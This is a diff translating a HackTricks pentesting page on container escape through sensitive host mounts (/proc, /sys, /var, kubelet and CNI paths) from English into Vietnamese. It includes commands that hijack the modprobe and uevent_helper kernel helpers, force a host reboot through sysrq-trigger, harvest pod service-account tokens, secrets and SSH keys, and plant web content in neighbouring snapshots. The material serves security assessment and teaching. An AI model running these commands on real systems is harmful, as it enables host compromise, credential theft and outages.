@@ -1,27 +1,27 @@
-# Sensitive Host Mounts
+# Các mount nhạy cảm của host
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Overview
+## Tổng quan
 
-Host mounts are one of the most important practical container-escape surfaces because they often collapse a carefully isolated process view back into direct visibility of host resources. The dangerous cases are not limited to `/`. Bind mounts of `/proc`, `/sys`, `/var`, runtime sockets, kubelet-managed state, or device-related paths can expose kernel controls, credentials, neighboring container filesystems, and runtime management interfaces.
+Các mount của host là một trong những bề mặt container escape quan trọng nhất trên thực tế, vì chúng thường làm mất hiệu lực của chế độ xem tiến trình được cô lập cẩn thận và cho phép truy cập trực tiếp vào tài nguyên của host. Những trường hợp nguy hiểm không chỉ giới hạn ở `/`. Bind mount của `/proc`, `/sys`, `/var`, socket runtime, trạng thái do kubelet quản lý hoặc các đường dẫn liên quan đến thiết bị có thể làm lộ các cơ chế điều khiển kernel, thông tin xác thực, filesystem của các container lân cận và giao diện quản lý runtime.
 
-This page exists separately from the individual protection pages because the abuse model is cross-cutting. A writable host mount is dangerous partly because of mount namespaces, partly because of user namespaces, partly because of AppArmor or SELinux coverage, and partly because of what exact host path was exposed. Treating it as its own topic makes the attack surface much easier to reason about.
+Trang này được tách riêng khỏi các trang bảo vệ riêng lẻ vì mô hình lạm dụng có phạm vi rộng. Một host mount có quyền ghi nguy hiểm một phần do mount namespace, một phần do user namespace, một phần do phạm vi bao phủ của AppArmor hoặc SELinux, và một phần do chính xác đường dẫn host nào bị lộ. Xem đây là một chủ đề riêng giúp việc phân tích bề mặt tấn công dễ dàng hơn nhiều.
 
-Also compare a host-writable directory with the corresponding path inside each container. If it is mounted over a directory of executable startup scripts, a lower-privileged host user may be able to plant code that a higher-privileged container entrypoint loads on its next restart. Confirm the exact bind source and destination, directory write/search permissions, entrypoint loop and executable-file requirement, runtime UID, and a real restart trigger. Container UID 0 is not automatically host UID 0; user-namespace mapping and mount policy determine the host effect. Passive review should report paths and permissions without writing a script or restarting the workload.
+Ngoài ra, hãy so sánh một thư mục trên host có quyền ghi với đường dẫn tương ứng bên trong từng container. Nếu thư mục đó được mount đè lên một thư mục chứa các script khởi động có thể thực thi, người dùng host có đặc quyền thấp hơn có thể đặt mã mà entrypoint của container có đặc quyền cao hơn sẽ tải trong lần khởi động lại tiếp theo. Hãy xác nhận chính xác nguồn và đích của bind mount, quyền ghi/tìm kiếm trên thư mục, vòng lặp của entrypoint và yêu cầu về tệp thực thi, UID runtime và một tác nhân thực sự kích hoạt khởi động lại. UID 0 trong container không tự động là UID 0 trên host; ánh xạ user namespace và chính sách mount quyết định tác động trên host. Khi rà soát thụ động, chỉ nên báo cáo đường dẫn và quyền, không ghi script hoặc khởi động lại workload.
 
-A Linux container may sit inside a management VM that shares part of a separate Windows host filesystem. [VirtualBox shared folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) are one way host files become visible in a guest, but root in that VM is still a distinct identity from a Windows administrator. If the share exposes a readable user's SSH private key, treat it as a credential lead: verify the exact host-backed mount, key ownership and access, the matching account, and the Windows SSH server's **effective** authorized-key policy before concluding that it permits a host login. Modern [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) commonly uses a separate `administrators_authorized_keys` file for administrator accounts. Keep private-key contents out of routine enumeration output; mount and key-path metadata are enough for passive triage.
+Một Linux container có thể nằm bên trong một VM quản lý chia sẻ một phần filesystem của một host Windows riêng. [Thư mục chia sẻ VirtualBox](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) là một cách khiến các tệp trên host hiển thị trong guest, nhưng root trong VM đó vẫn là một danh tính khác với quản trị viên Windows. Nếu thư mục chia sẻ làm lộ khóa SSH riêng của một người dùng mà có thể đọc được, hãy xem đó là đầu mối về thông tin xác thực: xác minh chính xác mount được ánh xạ từ host, quyền sở hữu và quyền truy cập của khóa, tài khoản tương ứng, cùng chính sách authorized-key **có hiệu lực** của SSH server trên Windows trước khi kết luận rằng khóa cho phép đăng nhập vào host. [OpenSSH trên Windows](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) hiện đại thường dùng tệp `administrators_authorized_keys` riêng cho các tài khoản quản trị viên. Không đưa nội dung khóa riêng vào đầu ra liệt kê thông thường; metadata về mount và đường dẫn khóa là đủ cho việc đánh giá thụ động ban đầu.
 
-## `/proc` Exposure
+## Mức độ phơi lộ `/proc`
 
-procfs contains both ordinary process information and high-impact kernel control interfaces. A bind mount such as `-v /proc:/host/proc` or a container view that exposes unexpected writable proc entries can therefore lead to information disclosure, denial of service, or direct host code execution.
+procfs chứa cả thông tin tiến trình thông thường lẫn các giao diện điều khiển kernel có tác động lớn. Vì vậy, một bind mount như `-v /proc:/host/proc` hoặc chế độ xem container làm lộ các mục proc có quyền ghi bất thường có thể dẫn đến rò rỉ thông tin, từ chối dịch vụ hoặc thực thi mã trực tiếp trên host.
 
-High-value procfs paths include:
+Các đường dẫn procfs có giá trị cao bao gồm:
 
 - `/proc/sys/kernel/core_pattern`
 - `/proc/sys/kernel/modprobe`
 - `/proc/sys/vm/panic_on_oom`
-- `/proc/sys/fs/binfmt_misc/` (especially `register` and `status`)
+- `/proc/sys/fs/binfmt_misc/` (đặc biệt là `register` và `status`)
 - `/proc/config.gz`
 - `/proc/sysrq-trigger`
 - `/proc/kmsg`
@@ -31,9 +31,9 @@ High-value procfs paths include:
 - `/proc/sched_debug`
 - `/proc/[pid]/mountinfo`
 
-### Abuse
+### Lạm dụng
 
-Start by checking which high-value procfs entries are visible or writable:
+Bắt đầu bằng cách kiểm tra những mục procfs có giá trị cao nào đang hiển thị hoặc có quyền ghi:
 
 ```bash
 for p in \
@@ -52,49 +52,49 @@ for p in \
 done
 ```
 
-These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.
+Các path này đáng chú ý vì những lý do khác nhau. `core_pattern`, `modprobe` và `binfmt_misc` có thể trở thành đường dẫn thực thi code trên host khi có quyền ghi. `kallsyms`, `kmsg`, `kcore` và `config.gz` là những nguồn reconnaissance hữu ích cho việc khai thác kernel. `sched_debug` và `mountinfo` tiết lộ ngữ cảnh về process, cgroup và filesystem, có thể giúp tái dựng cấu trúc host từ bên trong container.
 
-The practical value of each path is different, and treating them all as if they had the same impact makes triage harder:
+Giá trị thực tiễn của mỗi path khác nhau, và xem tất cả chúng như thể có cùng mức độ tác động sẽ khiến việc phân loại khó khăn hơn:
 
 - `/proc/sys/kernel/core_pattern`
-  If writable, this is one of the highest-impact procfs paths because the kernel will execute a pipe handler after a crash. A container that can point `core_pattern` at a payload stored in its overlay or in a mounted host path can often obtain host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
+  Nếu có quyền ghi, đây là một trong những path procfs có tác động lớn nhất vì kernel sẽ thực thi một pipe handler sau khi xảy ra crash. Container có thể trỏ `core_pattern` đến payload được lưu trong overlay hoặc trong một host path đã mount để thường có được khả năng thực thi code trên host. Xem thêm [read-only-paths.md](protections/read-only-paths.md) để biết ví dụ riêng.
 - `/proc/sys/kernel/modprobe`
-  This path controls the userspace helper used by the kernel when it needs to invoke module-loading logic. If writable from the container and interpreted in the host context, it can become another host code-execution primitive. It is especially interesting when combined with a way to trigger the helper path.
+  Path này kiểm soát userspace helper mà kernel sử dụng khi cần gọi logic nạp module. Nếu có thể ghi từ container và được diễn giải trong ngữ cảnh host, nó có thể trở thành một primitive thực thi code khác trên host. Path này đặc biệt đáng chú ý khi kết hợp với một cách kích hoạt helper.
 - `/proc/sys/vm/panic_on_oom`
-  This is not usually a clean escape primitive, but it can convert memory pressure into host-wide denial of service by turning OOM conditions into kernel panic behavior.
+  Đây thường không phải là một primitive escape rõ ràng, nhưng có thể biến áp lực bộ nhớ thành denial of service trên toàn host bằng cách chuyển tình trạng OOM thành hành vi kernel panic.
 - `/proc/sys/fs/binfmt_misc`
-  If the registration interface is writable, the attacker may register a handler for a chosen magic value and obtain host-context execution when a matching file is executed.
+  Nếu có quyền ghi vào interface đăng ký, attacker có thể đăng ký handler cho một magic value tùy chọn và có được khả năng thực thi trong ngữ cảnh host khi một file khớp được thực thi.
 - `/proc/config.gz`
-  Useful for kernel exploit triage. It helps determine which subsystems, mitigations, and optional kernel features are enabled without needing host package metadata.
+  Hữu ích cho việc phân loại kernel exploit. Nó giúp xác định những subsystem, mitigation và tính năng kernel tùy chọn nào được bật mà không cần metadata gói trên host.
 - `/proc/sysrq-trigger`
-  Mostly a denial-of-service path, but a very serious one. It can reboot, panic, or otherwise disrupt the host immediately.
+  Chủ yếu là một path denial of service, nhưng rất nghiêm trọng. Nó có thể reboot, gây panic hoặc làm gián đoạn host ngay lập tức.
 - `/proc/kmsg`
-  Reveals kernel ring buffer messages. Useful for host fingerprinting, crash analysis, and in some environments for leaking information helpful to kernel exploitation.
+  Tiết lộ thông báo trong kernel ring buffer. Hữu ích cho việc fingerprint host, phân tích crash và trong một số môi trường, làm leak thông tin hỗ trợ khai thác kernel.
 - `/proc/kallsyms`
-  Valuable when readable because it exposes exported kernel symbol information and may help defeat address randomization assumptions during kernel exploit development.
+  Có giá trị khi đọc được vì nó để lộ thông tin về các kernel symbol được export và có thể giúp vượt qua các giả định về address randomization trong quá trình phát triển kernel exploit.
 - `/proc/[pid]/mem`
-  This is a direct process-memory interface. If the target process is reachable with the necessary ptrace-style conditions, it may allow reading or modifying another process's memory. The realistic impact depends heavily on credentials, `hidepid`, Yama, and ptrace restrictions, so it is a powerful but conditional path.
+  Đây là một interface truy cập trực tiếp bộ nhớ process. Nếu có thể truy cập process mục tiêu với các điều kiện kiểu ptrace cần thiết, nó có thể cho phép đọc hoặc sửa đổi bộ nhớ của process khác. Tác động thực tế phụ thuộc nhiều vào credentials, `hidepid`, Yama và các hạn chế ptrace, vì vậy đây là một path mạnh nhưng có điều kiện.
 - `/proc/kcore`
-  Exposes a core-image-style view of system memory. The file is huge and awkward to use, but if it is meaningfully readable it indicates a badly exposed host memory surface.
-- `/dev/kmem` and `/dev/mem`
-  These are historically high-impact raw-memory **device** interfaces, not procfs files. On many modern systems they are absent or heavily restricted, but a container that can open a host-mounted copy should treat the exposure as critical. Review them with other sensitive `/dev` mounts rather than searching for the nonexistent `/proc/kmem` or `/proc/mem` paths.
+  Tiết lộ một góc nhìn kiểu core image về bộ nhớ hệ thống. File này rất lớn và khó sử dụng, nhưng nếu có thể đọc đáng kể thì đó là dấu hiệu cho thấy bề mặt bộ nhớ của host bị phơi lộ nghiêm trọng.
+- `/dev/kmem` và `/dev/mem`
+  Đây là các interface **device** truy cập bộ nhớ thô, có tác động lớn theo cách truyền thống, không phải file procfs. Trên nhiều hệ thống hiện đại, chúng không tồn tại hoặc bị hạn chế nghiêm ngặt, nhưng container có thể mở một bản sao được mount từ host thì nên xem mức độ phơi lộ này là nghiêm trọng. Hãy kiểm tra chúng cùng với các mount `/dev` nhạy cảm khác thay vì tìm các path `/proc/kmem` hoặc `/proc/mem` không tồn tại.
 - `/proc/sched_debug`
-  Leaks scheduling and task information that may expose host process identities even when other process views look cleaner than expected.
+  Làm leak thông tin về scheduling và task, có thể để lộ danh tính process trên host ngay cả khi các chế độ xem process khác trông có vẻ được bảo vệ tốt hơn dự kiến.
 - `/proc/[pid]/mountinfo`
-  Extremely useful for reconstructing where the container really lives on the host, which paths are overlay-backed, and whether a writable mount corresponds to host content or only to the container layer.
+  Cực kỳ hữu ích để tái dựng vị trí thực sự của container trên host, xác định path nào được hỗ trợ bởi overlay và liệu một mount có quyền ghi trỏ đến nội dung trên host hay chỉ đến layer của container.
 
-If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
+Nếu đọc được `/proc/[pid]/mountinfo` hoặc chi tiết overlay, hãy dùng chúng để tìm lại host path của filesystem container:
 
 ```bash
 cat /proc/self/mountinfo | head -n 50
 mount | grep overlay
 ```
 
-These commands are useful because a number of host-execution tricks require turning a path inside the container into the corresponding path from the host's point of view.
+Các lệnh này hữu ích vì một số thủ thuật thực thi trên host đòi hỏi chuyển đổi một đường dẫn bên trong container thành đường dẫn tương ứng theo góc nhìn của host.
 
-### Example: Preparing A `modprobe` Helper Path
+### Ví dụ: Chuẩn bị đường dẫn helper `modprobe`
 
-If `/proc/sys/kernel/modprobe` is writable from the container and the helper path is interpreted in the host context, it can be redirected to an attacker-controlled payload. The overlay upper directory must resolve from the host, and proof output must be written back into that same host-visible container layer if the container does not also mount host `/tmp`:
+Nếu có thể ghi vào `/proc/sys/kernel/modprobe` từ container và đường dẫn helper được diễn giải trong ngữ cảnh của host, đường dẫn này có thể được chuyển hướng đến payload do attacker kiểm soát. Thư mục upper của overlay phải được phân giải từ host, và kết quả chứng minh phải được ghi lại vào chính lớp container mà host nhìn thấy đó nếu container cũng không mount `/tmp` của host:
 
 ```bash
 [ -w /proc/sys/kernel/modprobe ] || exit 1
@@ -113,11 +113,11 @@ cat /tmp/modprobe.out
 printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
 ```
 
-The exact trigger depends on the target and kernel behavior and is deliberately not guessed. Restore the original value before leaving the lab. The important point is that a writable helper path can redirect a future kernel helper invocation into attacker-controlled host-path content. A missing overlay `upperdir`, a path that the host cannot resolve, a read-only sysctl mount, or a kernel that never invokes the selected helper breaks this chain.
+Trigger chính xác phụ thuộc vào mục tiêu và hành vi của kernel, nên cố ý không đoán trước. Khôi phục giá trị ban đầu trước khi rời lab. Điểm quan trọng là một đường dẫn helper có quyền ghi có thể chuyển hướng lần gọi helper trong tương lai của kernel đến nội dung trên đường dẫn host do attacker kiểm soát. `upperdir` của overlay bị thiếu, đường dẫn mà host không thể phân giải, mount sysctl chỉ đọc hoặc kernel không bao giờ gọi helper đã chọn đều làm đứt chuỗi này.
 
-### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`
+### Ví dụ đầy đủ: Trinh sát kernel với `kallsyms`, `kmsg` và `config.gz`
 
-If the goal is exploitability assessment rather than immediate escape:
+Nếu mục tiêu là đánh giá khả năng khai thác thay vì thoát ngay:
 
 ```bash
 head -n 20 /proc/kallsyms 2>/dev/null
@@ -125,23 +125,23 @@ dmesg 2>/dev/null | head -n 50
 zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
 ```
 
-These commands help answer whether useful symbol information is visible, whether recent kernel messages reveal interesting state, and which kernel features or mitigations are compiled in. The impact is usually not direct escape, but it can sharply shorten kernel-vulnerability triage.
+Các lệnh này giúp xác định liệu thông tin symbol hữu ích có hiển thị hay không, các thông điệp kernel gần đây có tiết lộ trạng thái đáng chú ý hay không, và những tính năng hoặc biện pháp giảm thiểu nào của kernel đã được biên dịch. Tác động thường không trực tiếp dẫn đến escape, nhưng có thể rút ngắn đáng kể quá trình phân loại lỗ hổng kernel.
 
-### Full Example: SysRq Host Reboot
+### Ví dụ đầy đủ: Khởi động lại host bằng SysRq
 
-If `/proc/sysrq-trigger` is writable and reaches the host view:
+Nếu có thể ghi vào `/proc/sysrq-trigger` và thao tác này tác động đến host:
 
 ```bash
 echo b > /proc/sysrq-trigger
 ```
 
-The effect is immediate host reboot. This is not a subtle example, but it clearly demonstrates that procfs exposure can be far more serious than information disclosure.
+Tác động là máy chủ khởi động lại ngay lập tức. Đây không phải là ví dụ kín đáo, nhưng nó cho thấy rõ việc để lộ procfs có thể nghiêm trọng hơn nhiều so với rò rỉ thông tin.
 
 ## `/sys` Exposure
 
-sysfs exposes large amounts of kernel and device state. Some sysfs paths are mainly useful for fingerprinting, while others can affect helper execution, device behavior, security-module configuration, or firmware state.
+sysfs để lộ lượng lớn trạng thái kernel và thiết bị. Một số đường dẫn sysfs chủ yếu hữu ích cho fingerprinting, trong khi những đường dẫn khác có thể ảnh hưởng đến việc thực thi helper, hoạt động của thiết bị, cấu hình security module hoặc trạng thái firmware.
 
-High-value sysfs paths include:
+Các đường dẫn sysfs có giá trị cao gồm:
 
 - `/sys/kernel/uevent_helper`
 - `/sys/class/thermal`
@@ -151,11 +151,11 @@ High-value sysfs paths include:
 - `/sys/firmware/efi/efivars`
 - `/sys/kernel/debug`
 
-These paths matter for different reasons. `/sys/class/thermal` can influence thermal-management behavior and therefore host stability in badly exposed environments. `/sys/kernel/vmcoreinfo` can leak crash-dump and kernel-layout information that helps with low-level host fingerprinting. `/sys/kernel/security` is the `securityfs` interface used by Linux Security Modules, so unexpected access there may expose or alter MAC-related state. EFI variable paths can affect firmware-backed boot settings, making them much more serious than ordinary configuration files. `debugfs` under `/sys/kernel/debug` is especially dangerous because it is intentionally a developer-oriented interface with far fewer safety expectations than hardened production-facing kernel APIs.
+Các đường dẫn này quan trọng vì những lý do khác nhau. `/sys/class/thermal` có thể ảnh hưởng đến hoạt động quản lý nhiệt và do đó ảnh hưởng đến độ ổn định của máy chủ trong các môi trường bị để lộ không đúng cách. `/sys/kernel/vmcoreinfo` có thể làm rò rỉ thông tin về crash dump và bố cục kernel, hỗ trợ fingerprinting máy chủ ở mức thấp. `/sys/kernel/security` là giao diện `securityfs` được Linux Security Modules sử dụng, vì vậy quyền truy cập bất ngờ vào đây có thể làm lộ hoặc thay đổi trạng thái liên quan đến MAC. Các đường dẫn biến EFI có thể ảnh hưởng đến thiết lập khởi động được lưu trong firmware, khiến chúng nghiêm trọng hơn nhiều so với các tệp cấu hình thông thường. `debugfs` trong `/sys/kernel/debug` đặc biệt nguy hiểm vì đây vốn là giao diện dành cho nhà phát triển, với ít kỳ vọng về độ an toàn hơn nhiều so với các API kernel hướng đến môi trường production đã được harden.
 
-Every sysfs entry in this list is **kernel-, configuration-, and hardware-dependent**. Current virtualized nodes commonly omit `uevent_helper`, EFI variables, and thermal-device entries entirely. Record an absent path as a negative prerequisite instead of assuming that an example from another kernel applies.
+Mọi mục sysfs trong danh sách này đều **phụ thuộc vào kernel, cấu hình và phần cứng**. Các node ảo hóa hiện nay thường hoàn toàn không có `uevent_helper`, biến EFI và mục thiết bị nhiệt. Hãy ghi nhận đường dẫn không tồn tại là một điều kiện tiên quyết không đáp ứng, thay vì cho rằng ví dụ từ kernel khác cũng áp dụng được.
 
-Useful review commands for these paths are:
+Các lệnh hữu ích để rà soát những đường dẫn này là:
 
 ```bash
 find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
@@ -165,17 +165,17 @@ find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
 cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
 ```
 
-What makes those commands interesting:
+Điều gì khiến các lệnh đó đáng chú ý:
 
-- `/sys/kernel/security` may reveal whether AppArmor, SELinux, or another LSM surface is visible in a way that should have stayed host-only.
-- `/sys/kernel/debug` is often the most alarming finding in this group. If `debugfs` is mounted and readable or writable, expect a wide kernel-facing surface whose exact risk depends on the enabled debug nodes.
-- EFI variable exposure is less common, but if present it is high impact because it touches firmware-backed settings rather than ordinary runtime files.
-- `/sys/class/thermal` is mainly relevant for host stability and hardware interaction, not for neat shell-style escape.
-- `/sys/kernel/vmcoreinfo` is mainly a host-fingerprinting and crash-analysis source, useful for understanding low-level kernel state.
+- `/sys/kernel/security` có thể cho biết liệu AppArmor, SELinux hoặc một LSM khác có đang hiển thị theo cách đáng ra chỉ host mới truy cập được hay không.
+- `/sys/kernel/debug` thường là phát hiện đáng báo động nhất trong nhóm này. Nếu `debugfs` được mount và có thể đọc hoặc ghi, hãy dự kiến có một bề mặt rộng hướng tới kernel, với rủi ro cụ thể tùy thuộc vào các nút debug được bật.
+- Việc lộ biến EFI ít phổ biến hơn, nhưng nếu có thì tác động rất lớn vì nó liên quan đến các cài đặt được lưu trong firmware, chứ không phải các tệp runtime thông thường.
+- `/sys/class/thermal` chủ yếu liên quan đến độ ổn định của host và tương tác với phần cứng, không phải kiểu thoát container bằng shell.
+- `/sys/kernel/vmcoreinfo` chủ yếu là nguồn để nhận diện host và phân tích sự cố crash, hữu ích để tìm hiểu trạng thái kernel ở mức thấp.
 
-### Full Example: `uevent_helper`
+### Ví dụ đầy đủ: `uevent_helper`
 
-`/sys/kernel/uevent_helper` is kernel- and configuration-dependent and is absent on many current systems. If it exists, is writable, and a usable `uevent` trigger is available, the kernel may execute an attacker-controlled helper. Proof output must use a path that is visible from both the host and container views:
+`/sys/kernel/uevent_helper` phụ thuộc vào kernel và cấu hình, và không có trên nhiều hệ thống hiện nay. Nếu nó tồn tại, có thể ghi, và có trigger `uevent` khả dụng, kernel có thể thực thi một helper do attacker kiểm soát. Bằng chứng đầu ra phải sử dụng một đường dẫn hiển thị được từ cả host lẫn container:
 
 ```bash
 [ -w /sys/kernel/uevent_helper ] || exit 1
@@ -200,15 +200,15 @@ cat /output
 printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
 ```
 
-The reason this works is that the helper path is interpreted from the host's point of view. Once triggered, the helper runs in the host context rather than inside the current container. `/sys/class/mem/null/uevent` is one concrete trigger on kernels that expose it; other devices may expose their own `uevent` files, but do not select one blindly on real hardware. Restore the original value before leaving the lab. Do not report this technique as available when the helper file or a controlled trigger is absent.
+Lý do cách này hoạt động là helper path được diễn giải theo góc nhìn của host. Khi được kích hoạt, helper chạy trong ngữ cảnh của host thay vì bên trong container hiện tại. `/sys/class/mem/null/uevent` là một trigger cụ thể trên các kernel có hỗ trợ; các thiết bị khác có thể có tệp `uevent` riêng, nhưng đừng chọn bừa trên phần cứng thực tế. Khôi phục giá trị ban đầu trước khi rời lab. Không báo cáo kỹ thuật này là khả dụng nếu không có tệp helper hoặc trigger có thể kiểm soát.
 
 ## `/var` Exposure
 
-Mounting the host's `/var` into a container is often underestimated because it does not look as dramatic as mounting `/`. In practice it can be enough to reach runtime sockets, container snapshot directories, kubelet-managed pod volumes, projected service-account tokens, and neighboring application filesystems. On modern nodes, `/var` is often where the most operationally interesting container state actually lives.
+Việc mount `/var` của host vào container thường bị đánh giá thấp vì trông không nghiêm trọng như mount `/`. Trên thực tế, việc này có thể đủ để truy cập các runtime socket, thư mục snapshot của container, volume pod do kubelet quản lý, token tài khoản dịch vụ được chiếu vào pod và filesystem của các ứng dụng lân cận. Trên các node hiện đại, `/var` thường là nơi chứa trạng thái container có ý nghĩa vận hành nhất.
 
 ### Kubernetes Example
 
-A pod with `hostPath: /var` can often read other pods' projected tokens and overlay snapshot content:
+Một pod có `hostPath: /var` thường có thể đọc token được chiếu vào các pod khác và nội dung snapshot overlay:
 
 ```bash
 find /host-var/ -type f -iname '*.env*' 2>/dev/null
@@ -216,20 +216,20 @@ find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
 cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
 ```
 
-These commands are useful because they answer whether the mount exposes only dull application data or high-impact cluster credentials. A readable service-account token may immediately turn local code execution into Kubernetes API access.
+Các lệnh này hữu ích vì chúng giúp xác định mount chỉ để lộ dữ liệu ứng dụng ít quan trọng hay thông tin xác thực cluster có tác động lớn. Token service-account có thể đọc được có thể ngay lập tức biến việc thực thi mã cục bộ thành quyền truy cập Kubernetes API.
 
-If the token is present, validate what it can reach instead of stopping at token discovery:
+Nếu token tồn tại, hãy xác minh những gì token có thể truy cập thay vì chỉ dừng lại ở việc phát hiện token:
 
 ```bash
 TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
 curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
 ```
 
-The impact here may be much larger than local node access. A token with broad RBAC can turn a mounted `/var` into cluster-wide compromise.
+Tác động ở đây có thể lớn hơn nhiều so với việc chỉ truy cập node cục bộ. Một token có RBAC rộng có thể biến `/var` được mount thành sự cố xâm phạm toàn bộ cluster.
 
-### Docker And containerd Example
+### Ví dụ về Docker và containerd
 
-On Docker hosts the relevant data is often under `/var/lib/docker`, while on containerd-backed Kubernetes nodes it may be under `/var/lib/containerd` or snapshotter-specific paths:
+Trên các host Docker, dữ liệu liên quan thường nằm trong `/var/lib/docker`, còn trên các node Kubernetes dùng containerd, dữ liệu có thể nằm trong `/var/lib/containerd` hoặc các đường dẫn riêng của snapshotter:
 
 ```bash
 docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
@@ -237,9 +237,9 @@ find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
 find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
 ```
 
-If the mounted `/var` exposes writable snapshot contents of another workload, the attacker may be able to alter application files, plant web content, or change startup scripts without touching the current container configuration.
+Nếu `/var` được mount và làm lộ nội dung snapshot có thể ghi của workload khác, kẻ tấn công có thể sửa đổi tệp ứng dụng, cài nội dung web hoặc thay đổi script khởi động mà không cần chạm đến cấu hình container hiện tại.
 
-On a **disposable lab workload**, writable snapshot content can demonstrate application tampering, secret recovery, or lateral movement. Map the runtime container ID to the exact snapshot first and never edit an unrelated or production snapshot:
+Trên một **workload lab dùng một lần**, nội dung snapshot có thể ghi cho thấy cách can thiệp ứng dụng, khôi phục secret hoặc di chuyển ngang. Trước tiên, hãy ánh xạ container ID của runtime đến đúng snapshot và tuyệt đối không chỉnh sửa snapshot không liên quan hoặc snapshot production:
 
 ```bash
 echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
@@ -247,15 +247,15 @@ grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
 find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
 ```
 
-These commands are useful because they show the three main impact families of mounted `/var`: application tampering, secret recovery, and lateral movement into neighboring workloads.
+Các lệnh này hữu ích vì cho thấy ba nhóm tác động chính của việc mount `/var`: can thiệp ứng dụng, thu thập bí mật và di chuyển ngang sang các workload lân cận.
 
-Direct snapshot writes bypass the runtime's normal state management and can corrupt the container or destroy evidence. Read-only discovery was reproduced locally against Docker `overlay2`: a marker written in a neighboring disposable container appeared below `/var/lib/docker/overlay2/<id>/diff/`. Keep actual snapshot modification limited to a disposable container created for that test.
+Việc ghi trực tiếp vào snapshot bỏ qua cơ chế quản lý trạng thái thông thường của runtime, có thể làm hỏng container hoặc phá hủy bằng chứng. Hoạt động dò tìm chỉ đọc đã được tái hiện cục bộ trên Docker `overlay2`: một marker được ghi trong container tạm thời lân cận xuất hiện bên dưới `/var/lib/docker/overlay2/<id>/diff/`. Chỉ sửa đổi snapshot thực tế trong container tạm thời được tạo riêng cho thử nghiệm đó.
 
-## Kubelet State, Plugins, And CNI Paths
+## Trạng thái Kubelet, plugin và các đường dẫn CNI
 
-A mount of `/var/lib/kubelet`, `/opt/cni/bin`, or `/etc/cni/net.d` is often exposed through privileged DaemonSets, CNI agents, CSI node plugins, GPU operators, and storage helpers. These mounts are easy to dismiss as "node plumbing", but they sit directly in the execution path for new pods and often contain kubelet credentials, projected secrets, registration sockets, and executable host-side plugin binaries.
+Mount `/var/lib/kubelet`, `/opt/cni/bin` hoặc `/etc/cni/net.d` thường được cung cấp thông qua DaemonSet có đặc quyền, tác nhân CNI, plugin nút CSI, toán tử GPU và các thành phần hỗ trợ lưu trữ. Những mount này dễ bị xem nhẹ như "hạ tầng kết nối của node", nhưng chúng nằm ngay trên đường thực thi của các pod mới và thường chứa thông tin xác thực kubelet, secret được chiếu vào, socket đăng ký và các binary plugin thực thi ở phía host.
 
-High-value targets include:
+Các mục tiêu có giá trị cao gồm:
 
 - `/var/lib/kubelet/pki`
 - `/var/lib/kubelet/pods`
@@ -266,7 +266,7 @@ High-value targets include:
 - `/opt/cni/bin`
 - `/etc/cni/net.d`
 
-Useful review commands are:
+Các lệnh kiểm tra hữu ích là:
 
 ```bash
 find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
@@ -276,17 +276,17 @@ find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
 grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
 ```
 
-Why these paths matter:
+Vì sao các đường dẫn này quan trọng:
 
-- `/var/lib/kubelet/pki` may expose kubelet client certificates and other node-local credentials that can sometimes be reused against the API server or kubelet-facing TLS endpoints, depending on cluster design.<sup>[[1]](#references)</sup>
-- `/var/lib/kubelet/pods` often contains projected service-account tokens and mounted Secrets for neighboring pods on the same node.
-- `/var/lib/kubelet/pod-resources/kubelet.sock` is mainly a reconnaissance surface, but a very useful one: it reveals which pods and containers currently own GPUs, hugepages, SR-IOV devices, and other scarce node-local resources.<sup>[[1]](#references)</sup>
-- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, and `/var/lib/kubelet/plugins_registry` reveal which CSI, DRA, and device plugins are installed and which sockets the kubelet is expected to talk to. If those directories are writable rather than merely readable, the finding becomes much more serious.<sup>[[1]](#references)</sup>
-- `/opt/cni/bin` and `/etc/cni/net.d` sit directly on the pod-network setup path. Writable access there is often a delayed host-execution primitive rather than just configuration exposure.<sup>[[2]](#references)</sup>
+- `/var/lib/kubelet/pki` có thể để lộ chứng chỉ client của kubelet và các thông tin xác thực khác chỉ tồn tại trên node, đôi khi có thể được dùng lại để truy cập API server hoặc các endpoint TLS mà kubelet cung cấp, tùy theo thiết kế của cluster.<sup>[[1]](#references)</sup>
